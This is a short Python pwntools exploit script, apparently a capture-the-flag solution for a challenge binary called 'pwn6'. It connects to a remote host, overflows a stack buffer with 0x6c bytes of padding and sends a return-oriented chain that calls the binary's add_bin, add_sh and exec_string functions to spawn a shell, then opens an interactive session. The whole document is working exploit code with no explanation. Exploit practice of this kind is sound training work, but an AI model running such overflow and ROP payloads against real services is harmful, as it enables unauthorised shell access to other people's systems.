from pwn import * 
context.log_level = 'debug'

#cn = process('./pwn6')
cn = remote('128.199.220.74', 10006)
bin = ELF('./pwn6')

p1ret = 0x080485ce
p2ret = 0x080485cd

pay = 'a'*0x6c + 'bbbb'
pay += p32(bin.symbols['add_bin']) + p32(p1ret) + p32(0xDEADBEEF)
pay += p32(bin.symbols['add_sh']) + p32(p2ret) + p32(0xCAFEBABE) + p32(0xBADF00D)
pay += p32(bin.symbols['exec_string'])

length = len(pay)

cn.recv()
cn.sendline(str(length+1))
cn.recv()
cn.sendline(pay)
cn.interactive()



